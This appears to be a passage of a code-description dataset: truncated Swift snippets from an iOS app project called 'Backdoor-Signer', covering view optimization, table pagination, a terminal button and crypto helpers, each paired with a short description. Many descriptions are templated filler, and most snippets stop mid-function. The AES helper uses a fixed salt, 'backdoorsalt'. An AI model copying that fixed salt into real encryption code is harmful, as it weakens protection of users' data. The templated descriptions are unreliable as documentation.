    "nl": "Function handleLowMemoryWarning - implements handlelowmemorywarning functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1968",
    "code": "func optimizeViewController(_ viewController: UIViewController) {\n// Use AppPerformanceOptimizer to optimize the view controller\nAppPerformanceOptimizer.shared.optimizeViewController(viewController)\n\n// Optimize table views\nif let tableVC = viewController as? UITableViewController {",
    "nl": "MARK: - View Controller Optimization / Optimize a view controller for better performance / - Parameter viewController: The view controller to optimize",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1969",
    "code": "private func optimizeTableViewController(_ tableViewController: UITableViewController) {\nlet tableView = tableViewController.tableView\n\n// Enable prefetching if not already enabled\ntableView?.prefetchDataSource = tableViewController as? UITableViewDataSourcePrefetching\n\n// Set estimatedRowHeight for better performance\nif tableView?.rowHeight == UITableView.automaticDimension {",
    "nl": "/ Optimize a table view controller / - Parameter tableViewController: The table view controller to optimize",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1970",
    "code": "private func trackCellReuseIdentifiers(in tableView: UITableView?) {\nguard let tableView = tableView else { return }",
    "nl": "/ Track cell reuse identifiers to find inefficient cell usage / - Parameter tableView: The table view to track",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1971",
    "code": "extension UIViewController {\n/// Apply optimization-related method swizzling\nstatic func optimizeLifecycleMethods() {",
    "nl": "MARK: - UIViewController Extension",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "extension"
  },
  {
    "id": "1972",
    "code": "static func optimizeLifecycleMethods() {\nlet originalMethod = class_getInstanceMethod(UIViewController.self, #selector(viewDidLoad))\nlet swizzledMethod = class_getInstanceMethod(UIViewController.self, #selector(optimized_viewDidLoad))\n\nif let originalMethod = originalMethod, let swizzledMethod = swizzledMethod {",
    "nl": "/ Apply optimization-related method swizzling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1973",
    "code": "@objc private func optimized_viewDidLoad() {\n// Call original implementation\noptimized_viewDidLoad()\n\n// Post notification for optimizer\nNotificationCenter.default.post(name: NSNotification.Name(\"ViewControllerDidLoad\"), object: self)\n\n// Apply view-specific optimizations\noptimizeViewHierarchy()\n}",
    "nl": "Function optimized_viewDidLoad - implements optimized viewdidload functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1974",
    "code": "private func optimizeViewHierarchy() {\n// Ensure rasterization for complex views\nfor subview in view.subviews {",
    "nl": "/ Apply optimizations to the view hierarchy",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1975",
    "code": "extension AppDelegate {\n/// Call this method from application(_:didFinishLaunchingWithOptions:)\nfunc integratePerformanceOptimizations() {",
    "nl": "MARK: - Integration with AppDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "extension"
  },
  {
    "id": "1976",
    "code": "func integratePerformanceOptimizations() {\nOptimizationIntegrator.shared.integrateOptimizations(in: UIApplication.shared)\n}\n}\n",
    "nl": "/ Call this method from application(_:didFinishLaunchingWithOptions:)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/OptimizationIntegrator.swift",
    "code_type": "function"
  },
  {
    "id": "1977",
    "code": "final class TableViewOptimizer: NSObject {\n// MARK: - Configuration\n\n/// Configuration for the table view optimizer\nstruct Configuration {",
    "nl": "/ A class that optimizes UITableView loading and scrolling performance",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "class"
  },
  {
    "id": "1978",
    "code": "struct Configuration {\n/// Number of items to load per page\nvar pageSize: Int = 20\n\n/// Whether to prefetch items\nvar enablePrefetching: Bool = true\n\n/// Number of items to prefetch\nvar prefetchDistance: Int = 10\n",
    "nl": "MARK: - Configuration / Configuration for the table view optimizer",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "struct"
  },
  {
    "id": "1979",
    "code": "private func setupTableView() {\nguard let tableView = tableView else { return }",
    "nl": "MARK: - Setup / Set up the table view for optimized performance",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1980",
    "code": "func configureFetchedResultsController(\nfetchRequest: NSFetchRequest<NSManagedObject>,\nmanagedObjectContext: NSManagedObjectContext,\nsectionNameKeyPath: String? = nil,\ncacheName: String? = nil\n) {",
    "nl": "MARK: - Core Data Integration / Configure with a fetched results controller for Core Data integration / - Parameters: /   - fetchRequest: The fetch request /   - managedObjectContext: The managed object context /   - sectionNameKeyPath: Optional key path for sections /   - cacheName: Optional cache name",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1981",
    "code": "func performFetch() {\nguard let fetchedResultsController = fetchedResultsController else {",
    "nl": "/ Perform fetch with the fetched results controller",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1982",
    "code": "func loadNextPage() {\nguard !isLoading, hasMorePages() else { return }",
    "nl": "MARK: - Pagination / Load the next page of data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1983",
    "code": "func hasMorePages() -> Bool {\nlet itemsLoaded = currentPage * configuration.pageSize\nreturn itemsLoaded < totalItems\n}\n\n// MARK: - Utility Methods\n\n/// Get the object at the given index path\n/// - Parameter indexPath: The index path\n/// - Returns: The managed object at the index path",
    "nl": "/ Check if there are more pages to load / - Returns: True if there are more pages",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1984",
    "code": "func object(at indexPath: IndexPath) -> NSManagedObject? {\nreturn fetchedResultsController?.object(at: indexPath)\n}\n\n/// Get the number of sections\n/// - Returns: The number of sections\nfunc numberOfSections() -> Int {",
    "nl": "MARK: - Utility Methods / Get the object at the given index path / - Parameter indexPath: The index path / - Returns: The managed object at the index path",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1985",
    "code": "func numberOfSections() -> Int {\nreturn fetchedResultsController?.sections?.count ?? 0\n}\n\n/// Get the number of objects in the given section\n/// - Parameter section: The section index\n/// - Returns: The number of objects in the section\nfunc numberOfObjects(in section: Int) -> Int {",
    "nl": "/ Get the number of sections / - Returns: The number of sections",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1986",
    "code": "func numberOfObjects(in section: Int) -> Int {\nreturn fetchedResultsController?.sections?[section].numberOfObjects ?? 0\n}\n\n/// Clear the cell height cache\nfunc clearCellHeightCache() {",
    "nl": "/ Get the number of objects in the given section / - Parameter section: The section index / - Returns: The number of objects in the section",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1987",
    "code": "func clearCellHeightCache() {\ncellHeightCache.removeAll()\n}\n\n/// Cache the height for a cell at the given index path\n/// - Parameters:\n///   - height: The height to cache\n///   - indexPath: The index path\nfunc cacheHeight(_ height: CGFloat, for indexPath: IndexPath) {",
    "nl": "/ Clear the cell height cache",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1988",
    "code": "func cacheHeight(_ height: CGFloat, for indexPath: IndexPath) {\n// Limit cache size\nif cellHeightCache.count > configuration.maxCachedCells {",
    "nl": "/ Cache the height for a cell at the given index path / - Parameters: /   - height: The height to cache /   - indexPath: The index path",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1989",
    "code": "func cachedHeight(for indexPath: IndexPath) -> CGFloat? {\nreturn cellHeightCache[indexPath]\n}\n\n/// Reset the pagination state\nfunc resetPagination() {",
    "nl": "/ Get the cached height for a cell at the given index path / - Parameter indexPath: The index path / - Returns: The cached height, if available",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1990",
    "code": "func resetPagination() {\ncurrentPage = 0\nisLoading = false\nclearCellHeightCache()\n}\n\n/// Set the total number of items available\n/// - Parameter count: The total number of items\nfunc setTotalItems(_ count: Int) {",
    "nl": "/ Reset the pagination state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1991",
    "code": "func setTotalItems(_ count: Int) {\ntotalItems = count\n}\n}\n\n// MARK: - UITableViewDataSourcePrefetching\n\nextension TableViewOptimizer: UITableViewDataSourcePrefetching {",
    "nl": "/ Set the total number of items available / - Parameter count: The total number of items",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1992",
    "code": "extension TableViewOptimizer: UITableViewDataSourcePrefetching {\nfunc tableView(_: UITableView, prefetchRowsAt indexPaths: [IndexPath]) {",
    "nl": "MARK: - UITableViewDataSourcePrefetching",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "extension"
  },
  {
    "id": "1993",
    "code": "func tableView(_: UITableView, prefetchRowsAt indexPaths: [IndexPath]) {\nguard configuration.enablePrefetching else { return }",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1994",
    "code": "func tableView(_: UITableView, cancelPrefetchingForRowsAt indexPaths: [IndexPath]) {\n// Cancel any prefetching operations for these rows\nfor indexPath in indexPaths {",
    "nl": "Function tableView - implements tableview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1995",
    "code": "extension TableViewOptimizer: NSFetchedResultsControllerDelegate {\nfunc controllerWillChangeContent(_: NSFetchedResultsController<NSFetchRequestResult>) {",
    "nl": "MARK: - NSFetchedResultsControllerDelegate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "extension"
  },
  {
    "id": "1996",
    "code": "func controllerWillChangeContent(_: NSFetchedResultsController<NSFetchRequestResult>) {\ntableView?.beginUpdates()\n}\n\nfunc controller(_: NSFetchedResultsController<NSFetchRequestResult>,\ndidChange _: NSFetchedResultsSectionInfo,\natSectionIndex sectionIndex: Int,\nfor type: NSFetchedResultsChangeType)\n{",
    "nl": "Function controllerWillChangeContent - implements controllerwillchangecontent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1997",
    "code": "func controller(_: NSFetchedResultsController<NSFetchRequestResult>,\ndidChange _: NSFetchedResultsSectionInfo,\natSectionIndex sectionIndex: Int,\nfor type: NSFetchedResultsChangeType)\n{",
    "nl": "Function controller - implements controller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1998",
    "code": "func controller(_: NSFetchedResultsController<NSFetchRequestResult>,\ndidChange _: Any,\nat indexPath: IndexPath?,\nfor type: NSFetchedResultsChangeType,\nnewIndexPath: IndexPath?)\n{",
    "nl": "Function controller - implements controller functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "1999",
    "code": "func controllerDidChangeContent(_: NSFetchedResultsController<NSFetchRequestResult>) {\ntableView?.endUpdates()\n}\n}\n\n// MARK: - SkeletonLoadingCell\n\n/// A table view cell that shows a skeleton loading animation\nclass SkeletonLoadingCell: UITableViewCell {",
    "nl": "Function controllerDidChangeContent - implements controllerdidchangecontent functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "2000",
    "code": "class SkeletonLoadingCell: UITableViewCell {\n// MARK: - UI Components\n\nprivate let containerView = UIView()\nprivate let iconView = UIView()\nprivate let titleView = UIView()\nprivate let subtitleView = UIView()\n\n// MARK: - Animation Layers\n",
    "nl": "MARK: - SkeletonLoadingCell / A table view cell that shows a skeleton loading animation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "class"
  },
  {
    "id": "2001",
    "code": "private func setupViews() {\nselectionStyle = .none\nbackgroundColor = .clear\n\n// Add container view\ncontainerView.backgroundColor = .systemBackground\ncontainerView.layer.cornerRadius = 8\ncontainerView.clipsToBounds = true\ncontainerView.translatesAutoresizingMaskIntoConstraints = false\ncontentView.addSubview(containerView)",
    "nl": "MARK: - Setup",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "2002",
    "code": "private func addGradientLayers() {\nlet views = [iconView, titleView, subtitleView]\n\nfor view in views {",
    "nl": "Function addGradientLayers - implements addgradientlayers functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "2003",
    "code": "func startAnimating() {\n// Create animation for shimmer effect\nlet animation = CABasicAnimation(keyPath: \"locations\")\nanimation.fromValue = [-1.0, -0.5, 0.0] // Start positions\nanimation.toValue = [1.0, 1.5, 2.0] // End positions\nanimation.duration = 1.5\nanimation.repeatCount = .infinity\n\n// Add animation to gradient layers\nfor layer in animationLayers {",
    "nl": "MARK: - Animation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "2004",
    "code": "func stopAnimating() {\n// Remove animations\nfor layer in animationLayers {",
    "nl": "Function stopAnimating - implements stopanimating functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "2005",
    "code": "override func layoutSubviews() {\nsuper.layoutSubviews()\n\n// Update gradient layer frames\nfor (index, layer) in animationLayers.enumerated() {",
    "nl": "MARK: - Layout",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "2006",
    "code": "override func didMoveToWindow() {\nsuper.didMoveToWindow()\n\nif window != nil {",
    "nl": "MARK: - Lifecycle",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TableViewOptimizer.swift",
    "code_type": "function"
  },
  {
    "id": "2007",
    "code": "final class TerminalButtonManager {\n// Singleton instance\nstatic let shared = TerminalButtonManager()\n\n// UI components\nprivate let floatingButton = FloatingTerminalButton()\n\n// Thread-safe state tracking\nprivate let stateQueue = DispatchQueue(label: \"com.backdoor.terminalButtonState\", qos: .userInteractive)\nprivate var _isPresentingTerminal = false",
    "nl": "/ Manages the floating terminal button across the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "class"
  },
  {
    "id": "2008",
    "code": "private func configureFloatingButton() {\n// Ensure it's above other views but below AI button\nfloatingButton.layer.zPosition = 998\nfloatingButton.isUserInteractionEnabled = true\n\n// Start position check timer for continuous accessibility\nstartPositionCheckTimer()\n}\n\nprivate func startPositionCheckTimer() {",
    "nl": "Function configureFloatingButton - implements configurefloatingbutton functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2009",
    "code": "private func startPositionCheckTimer() {\n// Invalidate existing timer if any\npositionCheckTimer?.invalidate()\n\n// Create a new timer that periodically checks button position\npositionCheckTimer = Timer.scheduledTimer(withTimeInterval: 30.0, repeats: true) { [weak self] _ in",
    "nl": "Function startPositionCheckTimer - implements startpositionchecktimer functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2010",
    "code": "private func checkButtonAccessibility() {\n// Skip if button is hidden or not in a view\nguard !floatingButton.isHidden, floatingButton.superview != nil else { return }",
    "nl": "Function checkButtonAccessibility - implements checkbuttonaccessibility functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2011",
    "code": "private func setupObservers() {\n// Observe orientation changes\nNotificationCenter.default.addObserver(\nself,\nselector: #selector(handleOrientationChange),\nname: UIDevice.orientationDidChangeNotification,\nobject: nil\n)\n\n// Observe interface style changes",
    "nl": "Function setupObservers - sets upobservers",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2012",
    "code": "@objc private func handleKeyboardWillShow(_ notification: Notification) {\nguard !isPresentingTerminal, !floatingButton.isHidden,\nlet keyboardFrame = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? CGRect,\nlet parentVC = parentViewController else { return }",
    "nl": "Function handleKeyboardWillShow - implements handlekeyboardwillshow functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2013",
    "code": "@objc private func handleKeyboardWillHide(_ notification: Notification) {\n// Reset button position when keyboard hides\nif !isPresentingTerminal && !floatingButton.isHidden {",
    "nl": "Function handleKeyboardWillHide - implements handlekeyboardwillhide functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2014",
    "code": "@objc private func handleTabChange(_: Notification) {\n// Skip if app is inactive\nguard isAppActive else {",
    "nl": "Function handleTabChange - implements handletabchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2015",
    "code": "private func attachToRootView() {\n// Skip if presenting terminal\nguard !isPresentingTerminal else {",
    "nl": "Function attachToRootView - implements attachtorootview functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2016",
    "code": "@objc private func handleOrientationChange() {\nDispatchQueue.main.async { [weak self] in",
    "nl": "Function handleOrientationChange - implements handleorientationchange functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2017",
    "code": "private func updateButtonPosition() {\n// Skip if button is hidden or app inactive\nguard !floatingButton.isHidden, isAppActive else { return }",
    "nl": "Function updateButtonPosition - updates buttonposition",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2018",
    "code": "@objc private func handleAppDidBecomeActive() {\nisAppActive = true\n\nDispatchQueue.main.asyncAfter(deadline: .now() + 0.3) { [weak self] in",
    "nl": "Function handleAppDidBecomeActive - implements handleappdidbecomeactive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2019",
    "code": "@objc private func handleAppWillResignActive() {\nisAppActive = false\nhide()\n\n// Invalidate timer when app is inactive\npositionCheckTimer?.invalidate()\npositionCheckTimer = nil\n}\n\n@objc private func updateButtonAppearance() {",
    "nl": "Function handleAppWillResignActive - implements handleappwillresignactive functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2020",
    "code": "@objc private func updateButtonAppearance() {\nDispatchQueue.main.async { [weak self] in",
    "nl": "Function updateButtonAppearance - updates buttonappearance",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2021",
    "code": "func show() {\nDispatchQueue.main.async { [weak self] in",
    "nl": "/ Show the terminal button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2022",
    "code": "func hide() {\nDispatchQueue.main.async { [weak self] in",
    "nl": "/ Hide the terminal button",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2023",
    "code": "@objc private func handleTerminalRequest() {\n// Ensure we're on main thread\nif !Thread.isMainThread {",
    "nl": "Function handleTerminalRequest - implements handleterminalrequest functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2024",
    "code": "@objc private func dismissTerminal() {\nguard let presentingVC = UIApplication.shared.topMostViewController()?.presentingViewController else {",
    "nl": "Function dismissTerminal - implements dismissterminal functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/App/TerminalButtonManager.swift",
    "code_type": "function"
  },
  {
    "id": "2025",
    "code": "class CryptoHelper {\n// Singleton instance\nstatic let shared = CryptoHelper()\n\nprivate init() {}",
    "nl": "/ Helper for basic cryptography operations using native iOS libraries",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift",
    "code_type": "class"
  },
  {
    "id": "2026",
    "code": "func encryptAES(_ data: Data, password: String) -> String? {\n// Generate a key from the password\nguard let key = deriveKeyData(from: password, salt: \"backdoorsalt\", keyLength: 32) else {",
    "nl": "MARK: - Encryption Methods / Encrypt data using AES with a password / - Parameters: /   - data: Data to encrypt /   - password: Password for encryption / - Returns: Encrypted data as a base64 string",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift",
    "code_type": "function"
  },
  {
    "id": "2027",
    "code": "func deriveKeyData(from password: String, salt: String, keyLength: Int) -> Data? {\nguard let passwordData = password.data(using: .utf8),\nlet saltData = salt.data(using: .utf8) else {",
    "nl": "MARK: - Helper Methods / Derive a key from a password using PBKDF2 / - Parameters: /   - password: The password to derive the key from /   - salt: Salt for the key derivation /   - keyLength: Length of the key to generate in bytes / - Returns: The derived key as Data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift",
    "code_type": "function"
  },
  {
    "id": "2028",
    "code": "func generateRandomBytes(length: Int) -> Data {\nvar randomBytes = [UInt8](repeating: 0, count: length)\nlet status = SecRandomCopyBytes(kSecRandomDefault, length, &randomBytes)\n\nif status == errSecSuccess {",
    "nl": "/ Generate random bytes for cryptographic operations / - Parameter length: Number of random bytes to generate / - Returns: Data containing random bytes",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift",
    "code_type": "function"
  },
  {
    "id": "2029",
    "code": "func crc32(of data: Data) -> UInt32 {\n// Initialize with all bits set\nvar checksum: UInt32 = 0xFFFFFFFF\n\n// Process each byte\ndata.forEach { byte in",
    "nl": "/ Calculate CRC32 checksum for data / - Parameter data: The data to calculate checksum for / - Returns: CRC32 checksum as UInt32",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift",
    "code_type": "function"
  },
  {
    "id": "2030",
    "code": "extension UIView {\n/// Set up constraints with native AutoLayout\n/// - Parameter constraints: Array of constraints to activate\nfunc setupConstraints(_ constraints: [NSLayoutConstraint]) {",
    "nl": "MARK: - UIView Extensions for AutoLayout",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "extension"
  },
  {
    "id": "2031",
    "code": "func setupConstraints(_ constraints: [NSLayoutConstraint]) {\ntranslatesAutoresizingMaskIntoConstraints = false\nNSLayoutConstraint.activate(constraints)\n}\n\n/// Set up constraints with a closure\n/// - Parameter setup: Closure that returns constraints to activate\nfunc setupConstraints(_ setup: (UIView) -> [NSLayoutConstraint]) {",
    "nl": "/ Set up constraints with native AutoLayout / - Parameter constraints: Array of constraints to activate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2032",
    "code": "func setupConstraints(_ setup: (UIView) -> [NSLayoutConstraint]) {\ntranslatesAutoresizingMaskIntoConstraints = false\nNSLayoutConstraint.activate(setup(self))\n}\n\n/// Update existing constraints\n/// - Parameter update: Closure that performs constraint updates\nfunc updateConstraints(_ update: () -> Void) {",
    "nl": "/ Set up constraints with a closure / - Parameter setup: Closure that returns constraints to activate",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2033",
    "code": "func updateConstraints(_ update: () -> Void) {\nupdate()\nlayoutIfNeeded()\n}\n\n/// Create a stack view with standard configuration\n/// - Parameters:\n///   - axis: Axis for the stack view\n///   - spacing: Spacing between items\n///   - views: Views to add to the stack",
    "nl": "/ Update existing constraints / - Parameter update: Closure that performs constraint updates",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift",
    "code_type": "function"
  },
  {
    "id": "2034",
    "code": "static func createStack(axis: NSLayoutConstraint.Axis,\nspacing: CGFloat = 8,\nviews: [UIView],\ninsets: UIEdgeInsets = .zero) -> UIStackView\n{",
